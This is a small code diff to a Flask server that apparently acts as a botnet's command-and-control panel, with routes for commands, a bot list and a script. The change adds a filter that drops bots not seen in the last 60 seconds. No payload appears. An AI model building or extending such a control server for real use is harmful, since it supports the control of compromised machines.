@@ -1,3 +1,4 @@
+import time
 from typing import Dict, List
 from flask import Flask, request, send_file, render_template
 from flask_socketio import SocketIO, emit
@@ -46,6 +47,8 @@ def command_control():
 @app.route('/botnets', methods=["GET"])
 @cross_origin()
 def get_botnets():
+    global botnets
+    botnets = list(filter(lambda b: (time.time_ns() // 1_000_000) - b.last_seen < 60_000, botnets))
     return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))
 
 @app.route('/script', methods=["GET"])
